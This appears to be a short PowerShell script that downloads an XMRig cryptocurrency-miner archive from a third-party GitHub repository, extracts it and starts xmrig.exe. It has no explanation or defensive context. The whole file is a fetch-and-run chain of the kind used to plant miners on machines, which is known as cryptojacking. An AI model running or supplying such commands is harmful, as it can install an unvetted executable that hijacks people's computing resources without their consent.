# Download the file
Invoke-WebRequest -Uri "https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig-6.21.0-msvc-win64.zip"

# Unzip the file
Expand-Archive -Path "xmrig-6.21.0-msvc-win64.zip" -DestinationPath "./unzipped" -Force

# Change directory
Set-Location -Path "./unzipped"
Set-Location -Path "./xmrig-6.21.0-msvc-win64"
# Execute the file
Start-Process -FilePath ".\xmrig.exe"
